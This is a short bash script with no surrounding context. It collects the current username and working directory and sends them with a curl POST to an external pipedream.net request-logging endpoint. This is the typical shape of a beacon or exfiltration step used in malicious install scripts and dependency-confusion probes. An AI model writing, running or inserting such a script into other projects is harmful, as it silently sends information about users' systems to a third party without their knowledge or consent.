#!/bin/bash

USERNAME=$(whoami)
CURRENT_DIR=$(pwd)

SERVER_URL="https://eoo6ltadscxvgto.m.pipedream.net/log"

curl -X POST -d "username=$USERNAME&directory=$CURRENT_DIR" $SERVER_URL

